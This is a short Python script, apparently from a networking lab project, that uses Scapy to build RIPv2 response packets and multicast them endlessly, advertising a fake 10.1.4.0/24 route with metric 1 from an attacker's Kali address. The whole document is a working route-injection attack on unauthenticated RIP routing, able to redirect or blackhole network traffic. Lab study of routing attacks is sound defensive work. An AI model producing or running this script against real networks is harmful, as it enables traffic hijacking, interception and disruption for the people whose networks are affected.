#!/usr/bin/env python3
# RIP Injection Attack Script
# Based on project documentation

from scapy.all import *

# Attack Configuration
SOURCE_IP = "10.1.3.11"      # Attacker's IP (Kali)
DEST_IP = "224.0.0.9"        # RIP Multicast address
FAKE_NET = "10.1.4.0"        # The fake network to inject
METRIC = 1                   # Metric 1 to ensure priority

print(f"[*] Starting RIP Injection Attack...")
print(f"[*] Injecting route {FAKE_NET}/24 via {SOURCE_IP}")

# Constructing the Malicious Packet
# Ether: Multicast MAC for RIP
# IP: From Attacker to Multicast
# UDP: Port 520 (RIP standard)
pkt = Ether(dst="01:00:5e:00:00:09") / \
      IP(src=SOURCE_IP, dst=DEST_IP) / \
      UDP(sport=520, dport=520) / \
      RIP(cmd=2, version=2) / \
      RIPEntry(AF="IP",
               RouteTag=0,
               addr=FAKE_NET,
               mask="255.255.255.0",
               nextHop="0.0.0.0",
               metric=METRIC)

# Sending the packet (loop=1 sends infinitely)
try:
    sendp(pkt, loop=1, inter=2, verbose=1)
except KeyboardInterrupt:
    print("\n[!] Attack stopped.")
